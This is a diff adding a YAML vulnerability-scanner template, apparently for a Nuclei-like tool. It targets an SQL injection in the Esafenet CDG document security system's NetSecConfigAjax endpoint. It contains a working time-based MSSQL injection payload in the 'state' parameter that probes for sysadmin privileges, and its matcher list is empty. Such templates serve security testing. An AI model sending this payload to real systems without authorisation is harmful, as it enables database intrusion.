@@ -1,0 +1,18 @@
+id: esafenet-netsecconfigajax-sqli
+brief:
+    title: Esafenet CDG NetSecConfigAjax - Sql Injection
+    by: adeljck
+    level: high
+    about: The `state` parameter of the `NetSecConfigAjax` interface of the Yisaitong electronic document security management system does not pre-compile and adequately verify the incoming data, resulting in ...
+    label:
+        - esafenet
+        - sqli
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/CDGServer3/NetSecConfigAjax;Service'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--
+      signs: []
